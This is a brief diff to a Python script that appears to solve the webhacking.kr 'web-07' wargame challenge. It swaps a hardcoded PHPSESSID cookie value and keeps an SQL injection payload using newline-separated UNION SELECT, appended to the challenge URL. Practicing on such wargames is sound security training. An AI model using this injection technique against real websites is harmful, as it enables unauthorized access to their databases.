@@ -2,8 +2,7 @@
 import urllib2
 import CookieManager
 
-sessionId = "d106ebfb4bba898681f92c7f5316fa6b"
-CookieManager.addCookie("PHPSESSID", sessionId)
+CookieManager.addCookie("PHPSESSID", "e28ad7cb81a98a13982054373940bf92")
 
 injectionQuery = "1)%0aunion%0aselect%0a(1+1"
 challengeUrl = "http://webhacking.kr/challenge/web/web-07/index.php?val=" + injectionQuery
